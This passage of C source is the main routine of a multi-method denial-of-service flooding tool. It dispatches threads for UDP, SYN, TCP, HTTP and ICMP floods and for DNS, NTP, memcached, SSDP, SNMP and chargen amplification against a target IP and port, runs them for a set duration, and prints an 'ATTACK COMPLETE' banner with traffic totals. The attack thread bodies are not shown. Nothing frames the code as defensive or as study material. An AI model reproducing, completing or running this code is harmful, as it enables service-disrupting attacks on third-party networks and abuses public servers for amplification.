        global_dest.sin_addr.s_addr = inet_addr(ip);
    }

    void *(*thread_func)(void *) = NULL;
    if (strcmp(method, "udp") == 0) thread_func = udp_thread;
    else if (strcmp(method, "syn") == 0) thread_func = syn_thread;
    else if (strcmp(method, "tcp") == 0) thread_func = tcp_thread;
    else if (strcmp(method, "http") == 0) thread_func = http_thread;
    else if (strcmp(method, "icmp") == 0) thread_func = icmp_thread;
    else if (strcmp(method, "dns") == 0) thread_func = dns_thread;
    else if (strcmp(method, "ntp") == 0) thread_func = ntp_thread;
    else if (strcmp(method, "memcached") == 0) thread_func = memcached_thread;
    else if (strcmp(method, "ssdp") == 0) thread_func = ssdp_thread;
    else if (strcmp(method, "snmp") == 0) thread_func = snmp_thread;
    else if (strcmp(method, "chargen") == 0) thread_func = chargen_thread;
    else if (strcmp(method, "mixed") == 0) thread_func = mixed_thread;
    else { printf("Invalid method.\n"); exit(1); }

    pthread_attr_t attr; pthread_attr_init(&attr); pthread_attr_setstacksize(&attr, THREAD_STACK_SIZE);
    pthread_t tids[threads];
    for (int i = 0; i < threads; i++) {
        char *arg = malloc(256); strcpy(arg, ip);
        memcpy(arg + 64, &port, sizeof(int)); memcpy(arg + 128, &i, sizeof(int));
        if (pthread_create(&tids[i], &attr, thread_func, arg) != 0) { threads = i; break; }
    }
    pthread_attr_destroy(&attr);

    time_t start = time(NULL); struct timespec ts;
    while (running && (time(NULL) - start) < duration) {
        if (!flood_mode) {
            printf("\r[%3ld/%3d] Sent: %10llu", time(NULL) - start, duration, total_sent);
            fflush(stdout);
        }
        clock_gettime(CLOCK_REALTIME, &ts); ts.tv_sec += 1;
        clock_nanosleep(CLOCK_REALTIME, TIMER_ABSTIME, &ts, NULL);
    }
    running = 0;
    for (int i = 0; i < threads; i++) pthread_join(tids[i], NULL);
    if (global_sock > 0) close(global_sock);

    printf("\n\n╔══════════════════════════════════════════════════════════════════╗\n");
    printf("║                      ✅ ATTACK COMPLETE ✅                        ║\n");
    printf("╠══════════════════════════════════════════════════════════════════╣\n");
    printf("║  Total Sent: %-20llu                                      ║\n", total_sent);
    printf("║  Total Data: %-20llu MB                                   ║\n", total_bytes/(1024*1024));
    printf("╚══════════════════════════════════════════════════════════════════╝\n\n");
    return 0;
}